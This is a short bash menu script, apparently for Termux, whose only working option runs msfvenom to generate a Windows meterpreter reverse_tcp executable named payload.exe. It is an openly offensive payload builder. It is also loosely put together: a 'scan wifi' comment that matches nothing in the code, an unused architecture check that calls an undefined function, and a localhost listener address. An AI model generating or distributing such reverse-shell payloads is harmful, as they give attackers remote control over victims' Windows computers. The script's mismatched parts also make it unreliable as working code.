# scan wifi and not root
#Tools list
#Adding colors


R="$(printf '\033[1;31m')"
G="$(printf '\033[1;32m')"
Y="$(printf '\033[1;33m')"
W="$(printf '\033[1;37m')"
C="$(printf '\033[1;36m')"

clear


figlet " Window "


echo
echo " ${C}[1] windows/meterpreter/reverse_tcp"
echo " [2] Exit " ${W}
echo
read -p ${Y}"Select option: "${W} user_input
echo

get_arch() {
    printf ${G}"[*] Checking device architecture ..."${W}
    case $(getprop ro.product.cpu.abi) in
        arm64-v8a)
            SYS_ARCH=arm64
            ;;
        armeabi|armeabi-v7a)
            SYS_ARCH=armhf
            ;;
        *)
            unsupported_arch
            ;;
    esac
}

win1() {
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe -o /root/payload.exe

}

Exit_2() {
exit

}


if [[ $user_input == "1" ]]; then
        echo ${G}"[*] open ..." ${W}
        echo
win1

elif [[ $user_input == "2" ]]; then
          echo ${G}"[*] Exiting ..." ${W}
          echo
Exit_2

else

echo ${R}"[*] Error, Select a option from the above list"${W}
echo

fi
